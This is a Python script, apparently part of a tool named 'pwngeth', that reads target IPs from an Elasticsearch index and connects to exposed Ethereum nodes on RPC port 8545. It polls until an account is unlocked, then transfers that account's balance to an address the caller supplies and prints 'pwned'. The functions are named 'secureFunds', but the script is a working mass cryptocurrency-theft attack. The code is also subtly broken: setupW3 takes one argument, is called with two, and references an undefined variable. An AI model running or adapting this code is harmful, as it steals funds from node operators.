import web3
import asyncio
import concurrent
import threading
import time
import json
from web3 import Web3
from pwngeth.es import ElasticsearchConsumer
from pwngeth.MyHTTPProvider import MyHTTPProvider

def query_es():
    es = ElasticsearchConsumer(cluster='localhost', index='hackgeth_main')
    return [t['_source'] for t in es.get_targets()]

def makeTransaction(w3adr, addr, amount, secure_addr):
    txn = {"from": addr, "to": secure_addr, "value": amount }
    txn['gas'] =w3adr.eth.estimateGas(txn)
    try:
        w3adr.eth.sendTransaction(txn)
        print('pwned')
        print(txn)
        return True
    except ValueError:
        return False

def secureFunds(ip, address,amount, secure_addr, timeout=300):
    web3 = Web3(MyHTTPProvider('http://{}:8545'.format(ip)))
    start = time.time()
    while time.time() < start + timeout:
        try:
            print(address)
            web3.eth.sign(address, text='')
            return makeTransaction(
                w3adr=web3,
                addr=address,
                amount=amount,
                secure_addr=secure_addr
            )
        except ValueError as e:
            time.sleep(1.5)
            continue
        except Exception as e:
            print(e)
    return False

async def run_blocking_tasks(executor, datum, secure_addr):
    loop = asyncio.get_event_loop()
    blocking_tasks = [
        loop.run_in_executor(
            executor,
            secureFunds,
            data['ip'],
            data['addr'],
            data['wei'],
            secure_addr
        )
        for data in datum
    ]
    completed, pending = await asyncio.wait(blocking_tasks)

def setupW3(datum):
    executor = concurrent.futures.ThreadPoolExecutor(
        max_workers=len(datum),
    )
    loop = asyncio.get_event_loop()
    try:
        loop.run_until_complete(run_blocking_tasks(
            executor=executor,
            datum=datum,
            secure_addr=secure_addr
        ))

    finally:
        loop.close()

def secure_funds_main(secure_addr):
    targets = query_es()
    setupW3(targets, secure_addr)
